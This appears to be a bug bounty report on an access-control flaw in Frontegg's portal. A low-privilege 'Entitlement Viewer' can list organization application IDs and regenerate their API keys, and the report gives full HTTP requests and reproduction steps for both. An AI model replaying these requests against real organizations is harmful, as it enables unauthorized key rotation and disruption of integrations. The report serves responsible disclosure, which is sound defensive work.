**Program:** Frontegg  **Asset:** portal.au.frontegg.com  **Weakness:** Improper Access Control

**Title: Low-Privilege User Can Access App IDs and Regenerate App API Keys Without Proper Authorization
## Description:

A low-privilege user (`Entitlement Viewer`) can **fetch sensitive application details** and **regenerate API keys** for any application in the organization **without proper authorization**.  

This issue occurs because:

1. Fetching **application IDs and metadata** is **not properly restricted**.  
2. **Regenerating API keys** does not re-check the user’s role for sensitive operations.  

**Important distinction:**  
- Attempts to **create** or **delete applications** are correctly blocked (`403 Forbidden`), showing proper permission checks.  
- Only the **fetch + regenerate** flow is vulnerable.

This allows a low-privilege user to escalate into admin-like actions **without ever being granted admin privileges**.


---

## Steps to Reproduce
1. Go to https://portal.au.frontegg.com/development/applications and create an app in your organization (you can create 2-3)
<img width="959" height="448" alt="Screenshot 2026-04-02 214616" src="https://github.com/user-attachments/assets/b337f45f-99c8-47d6-bf1e-fab4aade387d" />

2. Go to https://portal.au.frontegg.com/development/applications#/admin-box/users and add a team member with the **Entitlement Viewer** role.
<img width="959" height="448" alt="Screenshot 2026-04-02 215128" src="https://github.com/user-attachments/assets/9d6c6c51-29d5-4348-afbd-06119db2cfce" />

3. Now as the invited team member (attacker), accept the invite and login to account
4. Observe you only have access to few things and can't access https://portal.au.frontegg.com/development/applications to see the organization applications.
5. Now run the request below and observe that the response fetches app details and ID's in the organization even though this user should not have access to the organization apps. (Use the bearer token and cookie with the current one you have in the orgnaiztion)
```
GET /applications/resources/applications/v1?_excludeAgents=true HTTP/2
Host: api.au.frontegg.com
Cookie: [REDACTED_COOKIE]
Sec-Ch-Ua-Platform: "Windows"
Authorization: Bearer 
[REDACTED_BEARER_TOKEN]
Sec-Ch-Ua: "Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
X-Frame-Options: SAMEORIGIN
Origin: https://portal.au.frontegg.com
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://portal.au.frontegg.com/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Priority: u=1, i
```
6. Next send the request below to Regenerate API Key of any app in the organization (Use the bearer token and cookie with the current one you have in the orgnaiztion and also replace the `appId` with any of the ID's you fetched earlier)
```
POST /applications/resources/applications/v1/credentials/regenerate HTTP/2
Host: api.au.frontegg.com
Cookie: [REDACTED_COOKIE]
Sec-Ch-Ua-Platform: "Windows"
Authorization: Bearer 
[REDACTED_BEARER_TOKEN]
Sec-Ch-Ua: "Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: application/json
X-Frame-Options: SAMEORIGIN
Origin: https://portal.au.frontegg.com
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://portal.au.frontegg.com/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Priority: u=1, i
Content-Length: 48

{"appId":"SAVED_APP_ID"}
```
7. Observe that the request succeeds
8. Now as the organization owner go to the apps setting page (e.g: https://portal.au.frontegg.com/development/applications/APP_ID) and observe that the API Key as been regenerated
9. Verification of Proper Permission Checks (for context):

  **CREATE APP ATTEMPT** (Run the graph ql reuest below Using the same cookie and bearer token and observe the response `"errors":["Missing permissions: dp.applications.write.app"]`)
```
POST /applications/resources/applications/v1 HTTP/2
Host: api.au.frontegg.com
Cookie: [REDACTED_COOKIE]
Sec-Ch-Ua-Platform: "Windows"
Authorization: Bearer
[REDACTE_BEARER_TOKEN]
Frontegg-Environment-Id: ad8b5467-683d-400a-8658-0bf991f0eed7
Sec-Ch-Ua: "Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: application/json
X-Frame-Options: SAMEORIGIN
Origin: https://portal.au.frontegg.com
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://portal.au.frontegg.com/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Priority: u=1, i
Content-Length: 208

{"name":"NEW","appURL":"http://localhost:3000","loginURL":"https://app-g0fcgj4o3wpu.au.frontegg.com/oauth","accessType":"MANAGED_ACCESS","isDefault":false,"isActive":true,"type":"web","frontendStack":"react"}
```

**DELETE APP ATTEMPT** (Run the graph ql reuest below Using the same cookie and bearer token and observe the response `"errors":["Missing permissions: dp.applications.write.app"]`)
```
DELETE /applications/resources/applications/v1/3a3a71f9-8f7a-44ea-9a39-514f1a55622c HTTP/2
Host: api.au.frontegg.com
Cookie: [REDACTED_COOKIE]
Sec-Ch-Ua-Platform: "Windows"
Authorization: Bearer
[REDACTED_BEARER_TOKEN]
Frontegg-Environment-Id: ad8b5467-683d-400a-8658-0bf991f0eed7
Sec-Ch-Ua: "Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
X-Frame-Options: SAMEORIGIN
Origin: https://portal.au.frontegg.com
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://portal.au.frontegg.com/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Priority: u=1, i
```
---

## Impact
A low-privilege user can access sensitive application IDs and metadata and regenerate API keys without authorization, compromising the confidentiality and integrity of organizational apps and their integrations.

---

## Severity
**CVSS v3.0 Base Score:** 8.1 → High  

| Metric | Value |
|--------|-------|
| Attack Vector (AV) | Network |
| Attack Complexity (AC) | Low |
| Privileges Required (PR) | Low |
| User Interaction (UI) | None |
| Scope (S) | Unchanged |
| Confidentiality (C) | High |
| Integrity (I) | High |
| Availability (A) | None |

---
